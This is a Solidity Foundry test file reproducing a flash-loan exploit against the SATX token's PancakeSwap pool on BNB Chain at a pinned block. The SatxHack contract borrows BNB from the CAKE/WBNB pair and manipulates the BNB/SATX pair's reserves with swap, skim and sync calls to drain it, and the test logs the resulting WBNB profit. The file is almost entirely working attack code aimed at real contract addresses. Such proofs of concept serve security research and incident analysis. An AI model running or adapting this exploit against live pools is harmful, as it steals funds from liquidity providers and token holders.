// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant CakeBnbPair = IPancakePairV2(
    0x0eD7e52944161450477ee417DE9Cd3a859b14fD0
);
IPancakePairV2 constant BnbSatxPair = IPancakePairV2(
    0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4
);

contract SatxHack {
    address admin;

    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    constructor() payable {
        admin = msg.sender;
    }

    function fuckyou() public {
        BNB.deposit{value: 0.9 ether}();

        SATX.approve(address(pancakeRouterV2), type(uint256).max);
        BNB.approve(address(pancakeRouterV2), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(BNB);
        path[1] = address(SATX);
        // 0.001 bnb -> 13.397690168956297175 SATS
        pancakeRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.001 ether,
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        pancakeRouterV2.addLiquidity(
            address(BNB),
            address(SATX),
            0.001 ether,
            SATX.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1
        );

        CakeBnbPair.swap(
            0, // amount0Out
            60 ether, // amount1Out
            address(this), // to
            hex"31"
        );
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata /* data */
    ) public {
        amount0;
        amount1;

        require(sender == address(this), "FLASHCALL ERROR");

        if (msg.sender == address(CakeBnbPair)) {
            BnbSatxPair.swap(
                0.0001 ether,
                350018.558642186154111639 ether,
                address(this),
                hex"31"
            );

            SATX.transfer(
                address(BnbSatxPair),
                350018.558642186154111639 ether
            );
            BnbSatxPair.skim(address(this));
            BnbSatxPair.sync();

            BNB.transfer(address(BnbSatxPair), 0.0001 ether);

            address[] memory path = new address[](2);
            path[0] = address(SATX);
            path[1] = address(BNB);
            pancakeRouterV2
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    329400368926995122937449,
                    0,
                    path,
                    address(this),
                    block.timestamp + 1
                );

            // fee / (amount + fee)
            uint256 fee = (amount1 * swapFeeBase) /
                (swapFeeTotal - swapFeeBase);
            BNB.transfer(address(CakeBnbPair), amount1 + fee + 1);
        }

        if (msg.sender == address(BnbSatxPair)) {
            BNB.transfer(address(BnbSatxPair), 52 ether);
        }
    }
}

contract SatxTest is Test {
    SatxHack hacker;

    function setUp() public {
        vm.createSelectFork("bsc", 37_914_434 - 1);
    }

    function testExploit() public {
        hacker = new SatxHack{value: 0.900000001 ether}();
        hacker.fuckyou();

        emit log_named_decimal_uint(
            "WBNB Balance",
            BNB.balanceOf(address(hacker)),
            18
        );
    }
}
